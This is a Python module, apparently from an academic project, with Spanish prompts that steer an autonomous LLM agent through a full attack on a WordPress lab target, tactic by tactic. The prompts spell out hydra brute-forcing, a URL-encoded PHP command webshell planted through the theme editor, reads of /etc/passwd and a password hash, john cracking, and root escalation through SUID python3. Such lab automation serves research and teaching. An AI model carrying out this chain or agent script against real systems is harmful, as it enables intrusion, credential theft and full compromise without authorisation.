"""
Prompts para el agente atacante.

El diseno de prompts es critico para que el LLM tome decisiones coherentes.
Se divide en un prompt de sistema (personalidad y reglas) y prompts por tactica
(objetivo especifico y tecnicas disponibles).

El prompt de sistema establece que el agente es un pentester autonomo operando
en un lab controlado. Cada prompt tactico da contexto sobre que lograr y que
herramientas usar.
"""

ATTACKER_SYSTEM_PROMPT = """Eres un agente de penetration testing autonomo operando en un laboratorio \
controlado autorizado. Tu objetivo es ejecutar una cadena de ataque siguiendo \
las tacticas MITRE ATT&CK de forma metodica.

REGLAS:
- Ejecuta una accion a la vez. Analiza el resultado antes de decidir la siguiente.
- Adapta tu estrategia segun los datos que vas recopilando.
- Si una tecnica falla, intenta una alternativa dentro de la misma tactica.
- Cuando consideres que el objetivo de la tactica actual esta cumplido, indicalo.
- Usa las herramientas disponibles (nmap, hydra, sqlmap, curl, comandos shell).
- El target principal esta en {target_ip}.

CONTEXTO DE SEGURIDAD:
Esto es un laboratorio de simulacion con fines academicos. Todas las maquinas \
son vulnerables intencionalmente. No hay sistemas reales en riesgo."""

TACTIC_PROMPTS = {
    "reconnaissance": """TACTICA ACTUAL: Reconnaissance (TA0043)

OBJETIVO: Descubrir servicios, puertos y tecnologias del target {target_ip}.

TECNICAS DISPONIBLES:
- T1046 Network Service Discovery: usa nmap para escanear puertos y detectar servicios.
- Enumeracion web: usa nikto para detectar tecnologias y vulnerabilidades HTTP.
- Enumeracion de directorios: usa gobuster para descubrir rutas ocultas.

QUE NECESITAS LOGRAR:
1. Identificar puertos abiertos (especialmente HTTP 80 / HTTPS 443)
2. Detectar tecnologias web (Apache, WordPress, PHP)
3. Encontrar archivos clave: robots.txt, login pages, archivos de configuracion
4. Identificar posibles vectores de ataque para Initial Access

DATOS RECOPILADOS HASTA AHORA:
{collected_data}

Cuando tengas un mapa claro de los servicios y tecnologias, indica que la tactica \
esta completa.""",

    "initial_access": """TACTICA ACTUAL: Initial Access (TA0001)

OBJETIVO: Obtener acceso de administrador al sistema target {target_ip}.

TECNICAS DISPONIBLES:
- T1078 Valid Accounts: obtener credenciales validas e iniciar sesion en WordPress.
- T1190 Exploit Public-Facing Application: explotar archivos expuestos para obtener credenciales.

PASOS RECOMENDADOS PARA WORDPRESS:
1. Descargar robots.txt para identificar archivos expuestos:
   run_command("curl -s http://{target_ip}/robots.txt")
2. Examinar archivos de texto expuestos en busca de credenciales:
   run_command("curl -s http://{target_ip}/license.txt")
   Si el contenido parece base64, decodificarlo:
   run_command("echo 'CONTENIDO_BASE64' | base64 -d")
3. Si no se obtienen credenciales directas, enumerar usuarios y usar fuerza bruta:
   run_wpscan(url="http://{target_ip}", flags="--enumerate u --disable-tls-checks")
   run_command("hydra -l USUARIO_ENCONTRADO -P /opt/wordlists/mrrobot.txt {target_ip} http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:ERROR' -t 4 -f")
4. Confirmar acceso con las credenciales obtenidas (reemplaza USUARIO y CREDENCIAL):
   run_command("curl -s -D - -c /tmp/wp_cookies.txt -b 'wordpress_test_cookie=WP+Cookie+check' -d 'log=USUARIO&pwd=CREDENCIAL&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' http://{target_ip}/wp-login.php | head -15")
   (Location: /wp-admin/ en los headers indica login exitoso)

QUE NECESITAS LOGRAR:
1. Obtener credenciales de WordPress via archivos expuestos o fuerza bruta
2. Iniciar sesion exitosamente (redireccion HTTP 302 a /wp-admin/)

DATOS RECOPILADOS HASTA AHORA:
{collected_data}

Cuando tengas credenciales validas y sesion confirmada, indica que la tactica esta completa.""",

    "execution": """TACTICA ACTUAL: Execution (TA0002)

OBJETIVO: Desplegar una webshell en el target {target_ip} via WordPress y ejecutar comandos.

TECNICAS DISPONIBLES:
- T1059 Command and Scripting Interpreter: insertar webshell PHP en tema activo via panel admin de WordPress.

PASOS PARA DESPLEGAR WEBSHELL VIA WORDPRESS THEME EDITOR:
1. Autenticarse con las credenciales de Initial Access y guardar cookies de sesion:
   run_command("curl -s -D - -c /tmp/wp_cookies.txt -b 'wordpress_test_cookie=WP+Cookie+check' -d 'log=USUARIO&pwd=CREDENCIAL&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' http://{target_ip}/wp-login.php | head -10")
   (Location: /wp-admin/ en la respuesta indica login exitoso)
2. Obtener el nonce _wpnonce del formulario HTML del editor de temas:
   run_command("curl -s -b /tmp/wp_cookies.txt 'http://{target_ip}/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen' | grep -oP 'name=\"_wpnonce\" value=\"\\K[^\"]+' | head -1")
3. Insertar webshell en 404.php (reemplaza NONCE; action=editedfile es el endpoint correcto para WordPress 4.x):
   run_command("curl -s -b /tmp/wp_cookies.txt -X POST http://{target_ip}/wp-admin/theme-editor.php -d 'action=editedfile&_wpnonce=NONCE&file=404.php&theme=twentyfifteen&newcontent=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29%7Bsystem%28%24_GET%5B%27cmd%27%5D%29%3B%7D%3F%3E'")
4. Verificar que la webshell ejecuta comandos (el output debe ser texto del sistema, NO HTML):
   run_web_shell(cmd="id", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
   Si el output contiene '<!DOCTYPE' o '<html', el deploy fallo — verifica el nonce y reintenta.
   run_web_shell(cmd="uname -a", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")

QUE NECESITAS LOGRAR:
1. Sesion autenticada en el panel de administracion de WordPress
2. Webshell PHP insertada en el tema activo y operativa
3. RCE verificado: run_web_shell debe retornar texto del sistema (uid=33, Linux...), no HTML

DATOS RECOPILADOS HASTA AHORA:
{collected_data}

Cuando la webshell este operativa y hayas ejecutado comandos exitosamente, \
indica que la tactica esta completa.""",

    "discovery": """TACTICA ACTUAL: Discovery (TA0007)

OBJETIVO: Explorar el sistema comprometido {target_ip} usando la webshell desplegada.

TECNICAS DISPONIBLES:
- T1082 System Information Discovery: obtener info del OS via webshell.
- T1083 File and Directory Discovery: enumerar archivos sensibles en el target.

EJECUTAR VIA WEBSHELL (url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php"):
1. run_web_shell(cmd="uname -a && whoami && id", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
2. run_web_shell(cmd="cat /etc/passwd", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
3. run_web_shell(cmd="ls -la /home/robot/", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
4. run_web_shell(cmd="cat /home/robot/password.raw-md5", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")

QUE NECESITAS LOGRAR:
1. Identificar el OS y usuario actual (www-data)
2. Encontrar /home/robot/password.raw-md5 y su contenido
3. Registrar el hash MD5 para la siguiente fase (Credential Access)

DATOS RECOPILADOS HASTA AHORA:
{collected_data}

IMPORTANTE: Si run_web_shell retorna HTML (contiene '<!DOCTYPE' o 'html'), la webshell no esta operativa. No declares la tactica completa hasta obtener output real del sistema operativo.

Cuando tengas el hash de password de robot (formato: robot:HASH), indica que la tactica esta completa.""",

    "credential_access": """TACTICA ACTUAL: Credential Access (TA0006)

OBJETIVO: Crackear el hash MD5 obtenido durante Discovery para obtener la contrasena del usuario robot.

TECNICAS DISPONIBLES:
- T1003 OS Credential Dumping: crackear hash MD5 con John the Ripper.

PASOS:
1. Usar john para crackear el hash encontrado en Discovery (usa el hash del historial de la conversacion):
   run_john(hash_content="robot:HASH_MD5_ENCONTRADO")
2. Una vez crackeada la contrasena, verificar acceso como robot via webshell:
   run_web_shell(cmd="echo 'CONTRASENA_CRACKEADA' | su -s /bin/bash robot -c 'cat /home/robot/key-2-of-3.txt'", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")

QUE NECESITAS LOGRAR:
1. Crackear el hash MD5 del usuario robot
2. Leer /home/robot/key-2-of-3.txt como usuario robot

DATOS RECOPILADOS HASTA AHORA:
{collected_data}

IMPORTANTE: El hash debe provenir del output real de run_web_shell en la tactica Discovery. No declares completo hasta tener la contrasena crackeada confirmada por john.

Cuando tengas la contrasena de robot y puedas leer key-2-of-3.txt, indica que la tactica esta completa.""",

    "privilege_escalation": """TACTICA ACTUAL: Privilege Escalation (TA0004)

OBJETIVO: Escalar de www-data a root en el target {target_ip} y leer key-3-of-3.txt.

TECNICAS DISPONIBLES:
- T1548 Abuse Elevation Control Mechanism: explotar binario python3 con SUID.

PASOS VIA WEBSHELL:
1. Buscar binarios con SUID:
   run_web_shell(cmd="find / -perm -u=s -type f 2>/dev/null", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
2. Explotar python3 SUID para leer archivo de root:
   run_web_shell(cmd="python3 -c \\"import os; os.setuid(0); os.system('cat /root/key-3-of-3.txt')\\"", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
3. Confirmar acceso root:
   run_web_shell(cmd="python3 -c \\"import os; os.setuid(0); os.system('id')\\"", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")

QUE NECESITAS LOGRAR:
1. Identificar binario SUID explotable (python3)
2. Ejecutar comando como root
3. Leer /root/key-3-of-3.txt

DATOS RECOPILADOS HASTA AHORA:
{collected_data}

Cuando hayas leido key-3-of-3.txt como root, indica que la tactica esta completa.""",
}


def build_tactic_prompt(tactic_name: str, target_ip: str, collected_data: dict) -> str:
    """Construye el prompt contextualizado para la tactica actual."""
    template = TACTIC_PROMPTS.get(tactic_name, "")
    if not template:
        return f"Ejecuta la tactica '{tactic_name}' contra {target_ip}."

    data_str = _format_collected_data(collected_data)
    return template.format(target_ip=target_ip, collected_data=data_str)


def _format_collected_data(data: dict) -> str:
    """Formatea los datos recopilados para incluirlos en el prompt."""
    if not data:
        return "Revisa el historial de la conversacion para acceder a los hallazgos de tacticas anteriores."

    parts = []
    for key, value in data.items():
        if isinstance(value, list):
            parts.append(f"- {key}: {', '.join(str(v) for v in value)}")
        elif isinstance(value, dict):
            parts.append(f"- {key}:")
            for k, v in value.items():
                parts.append(f"    {k}: {v}")
        else:
            parts.append(f"- {key}: {value}")
    return "\n".join(parts)
